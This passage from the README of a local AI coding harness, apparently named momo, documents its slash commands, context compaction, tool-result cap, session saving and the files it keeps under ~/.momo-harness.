| `/index-filter add\|remove <pattern>` | Add or remove one filter line (`!pattern` re-includes) |
| `/index-filter edit` | Edit the filter in `$VISUAL`/`$EDITOR` (TUI; in the web UI: View → Code index → Filter…) |
| `/index-filter reset` | Re-create the filter from the project's current `.gitignore` files |
| `/tool-output on\|off` | Show or hide the tool calls pane |
| `/think-output on\|off` | Show or hide model thinking/reasoning blocks (also `Shift+T`) |
| `/markdown on\|off` | Enable or disable markdown rendering for assistant output (also `Shift+M`) |
| `/diff on\|off` | Show or hide colored diffs of file edits (also `Shift+D`) |
| `/diff-style git\|compact` | Choose diff presentation: full `git diff` layout or compact (default) |
| `/list-skills` | List available skills and show which are active |
| `/load-skill <name>` | Append a skill's instructions to the system prompt |
| `/unload-skill <name>` | Remove a skill from the system prompt |
| `/context` | Show context limit and current token usage |
| `/context <n>` | Set an absolute context token limit (e.g. `/context 16384`); minimum 256; clears any percentage scale; kept across restarts unless larger than the model's window |
| `/context <n>%` | Set the context limit as a percentage of the model's native maximum (e.g. `/context 75%`); saved in session and reapplied on model switch |
| `/tool-result` | Show the current tool result character cap |
| `/tool-result <n>` | Set the cap (e.g. `/tool-result 8000`); `0` = unlimited |
| `/run-mode [new\|classic]` | How `run_command` returns output: saved to a log with a view (`new`, default) or all of it (`classic`). See [Command output](#command-output) |
| `/run-output-limit [n]` | Characters in `run_command`'s default view (default 5000) |
| `/compact` | Compact context — removes old messages and summarises them with the LLM |
| `/fast-compact` | Compact context without LLM summarisation (instant) |
| `/clear` | Clear conversation history and discard any active plan (removes `.momo-plan.md`, like `/plan cancel`) |
| `/new` | Save this session and start a new, empty one (same model, host and mode) |
| `/retry` | Re-send your last message, replacing the reply it got |
| `/cost` | Show token usage for this session, aggregated by mode and model (in/out/total tokens per combination) |
| `/sessions` | List up to 20 recent sessions with mode and model |
| `/session` | Show the current session file path |
| `/session <name>` | Load a saved session by exact name or partial prefix (e.g. `2026-06-22` matches the first session from that date) |
| `/export` | Export the conversation to a Markdown file in the working directory (filename: `conversation-<timestamp>.md`) |
| `/export <filename>` | Export to a specific filename |
| `/copy` | Copy the last assistant message to the clipboard (tries `pbcopy`, then `xclip`, then `xsel`) |
| `/copy all` | Copy the full conversation to the clipboard |
| `/ls [path]` | List directory contents directly (no model round-trip) |
| `/read <path> [start] [end]` | Read a file directly, with optional line range |
| `/grep <pattern> [path_or_dir]` | Regex search in a file or across a directory directly |
| `/exit` or `/quit` | Save session and exit |

## Context Management

The harness automatically detects the model's native context window on startup and uses half of it as the working limit (e.g. a 262,144-token model gets a 131,072-token limit). Use `--context N` or `/context N` to override.

At startup the harness checks the server before the first turn, because a restored session and the prefs can be stale:

- **Model.** A llama.cpp server serves one model, so the harness adopts whatever it has loaded. With Ollama, if the saved model is no longer installed, the harness switches to a model Ollama has in memory. If none is in memory, it warns you to pick one with `/model`.
- **Context size.** The limit follows the model's current window. A limit you set yourself (`/context N`, `--context N`) is kept, unless it is larger than the window. Sessions saved before this check existed restore every limit as the model's default.
- **Report.** One startup line shows the model, the window and the compaction point, and lists anything that changed from the saved settings. If the server is unreachable, nothing is changed.

Token usage is estimated as `sum(len(content) // 4)` across all messages (a fast approximation). Tool call argument content is not counted, so real usage in tool-heavy sessions can be higher than the displayed percentage.

Compaction fires automatically when token usage exceeds the limit:

1. **Pass 1** — removes tool-call groups (oldest first): the assistant message that issued tool calls plus all its tool/thinking result messages are removed as a unit until usage drops to 33% of the limit.
2. **Pass 2** — if still over limit, removes the oldest user/assistant message pairs until the target is met.

After removing messages the harness makes a one-shot LLM call to summarise what was dropped and prepends the summary to the oldest remaining user message so the model retains key context. The notice in the chat pane says "summarised N messages" when this succeeds, or "removed N messages" if summarisation was skipped or failed.

The system prompt is never removed. Compaction runs on the worker thread — the TUI stays responsive and shows the spinner while the summary is being generated.

Use `/fast-compact` to skip LLM summarisation and compact immediately.

## Tool Result Cap

By default tool results are passed to the model without truncation. Set a cap to prevent a single large result from consuming the context window:

```
/tool-result          # show current cap (0 = unlimited)
/tool-result 8000     # cap results at 8000 chars
/tool-result 0        # disable cap (unlimited)
```

`run_command` and `command_output` in run mode `new`, and `fetch_url`, are not cut: they size their own output (see [Command output](#command-output)).

Truncated results are cut at the last line boundary before the cap and display a notice: `... (truncated after N chars of M — use read_file with start_line/end_line for specific sections)` so the model knows more content exists and gets an actionable hint for how to retrieve the rest.

## Sessions

Each session is automatically saved after every assistant response to:

```
~/.momo-harness/sessions/<timestamp>.json
```

Each session stores the model, Ollama host, mode, working directory, context settings, active skills, input history, and the full message history — all restored when the session is reloaded (the auth token is the only thing deliberately left out).

A log file (`.log`) is written alongside the JSON, recording every request, response, tool call, and token count in newline-delimited JSON format. Use it to audit what the model did or analyse token usage.

```
/sessions             # list recent sessions with mode and model
/session 2026-06-22   # load by partial prefix
/export               # save the current conversation as a Markdown file
/copy                 # copy the last assistant response to the clipboard
```

## Where momo stores data

Everything momo keeps between runs lives in `~/.momo-harness/`. Nothing is sent anywhere; deleting the folder resets momo completely.

```
~/.momo-harness/
├── prefs.json               # remembered settings
├── sessions/
│   ├── <timestamp>.json     # one conversation
│   └── <timestamp>.log      # its request/tool log (NDJSON)
├── index/<hash>.pickle      # saved code index per workdir (/index save, /index-persist)
├── index/<hash>.filter      # which files that workdir's index covers (/index-filter)
├── runs/<timestamp>/rN.log  # saved run_command output (/run-mode new), per session
└── tls/                     # only with --web-tls auto (folder 0700, keys 0600)
    ├── momo-ca.pem          # the CA certificate you trust on your devices
    ├── momo-ca.key          # the CA's private key — never share
    ├── momo-ca.json         # the names the CA may vouch for
    ├── server.pem / .key    # this machine's HTTPS certificate
    └── server.json          # the names it covers, and its expiry
```

| Path | What | Notes |
|---|---|---|
| `prefs.json` | Provider, model, code index settings, guides, companion idle recap, run mode | Security switches (`/net`, `/net-confirm`, `/tools`, `/run-confirm`) are never saved |
| `sessions/*.json` | Messages, mode, model, host, workdir, context settings, active skills, plan, input history | Saved after every reply; the auth token is never stored. Delete them from the web UI's session drawer |
| `sessions/*.log` | Every request, response, tool call and token count | Secret request headers are masked |
| `index/*.pickle` | The code index, named by a hash of the workdir | Mode `0600`; only loaded if it is yours and not writable by others |
| `runs/<session>/rN.log` | Full output of each `run_command` in run mode `new` | Last 20 per session; deleted on `/clear`, `/new` and session load; other sessions' folders removed after 3 days |
| `tls/` | momo's local CA and HTTPS certificate | Deleting it creates a new CA on the next `--web-tls auto` start; every device must trust it again |

Elsewhere: `.momo-plan.md` in the workdir while a plan exists, `conversation-<timestamp>.md` from `/export`, and the web UI's theme, view and notification settings in each browser's `localStorage`. The `/token` value and the web UI access token are never stored anywhere.

Keep `~/.momo-harness/` private: sessions and logs contain your conversations, tool output from your code and your project paths.
